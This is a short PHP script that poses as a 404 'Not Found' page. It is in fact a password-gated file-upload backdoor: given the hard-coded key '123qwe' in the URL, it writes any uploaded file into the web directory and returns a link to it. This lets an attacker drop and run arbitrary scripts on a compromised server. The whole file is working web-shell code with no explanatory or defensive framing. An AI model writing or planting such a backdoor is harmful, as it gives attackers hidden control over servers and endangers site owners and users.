<?php
if (!empty($_GET['auth']) and $_GET['auth'] == '123qwe')
{

 if ($_FILES["filename"] == '')
 {
 ?><?php }else{
    if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
    {
    move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
      $ss = explode('/', $_SERVER["SCRIPT_NAME"]);
     $ss = $ss[count($ss)-1];
    echo "<a href=\"http://".$_SERVER["HTTP_HOST"].str_ireplace($ss, $_FILES["filename"]["name"], $_SERVER["SCRIPT_NAME"])."\">Перейти по ссылке</a>";
    } else {
    echo("FILE_Bad");
    }
 }
}else{
echo "<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>";
}
   ?>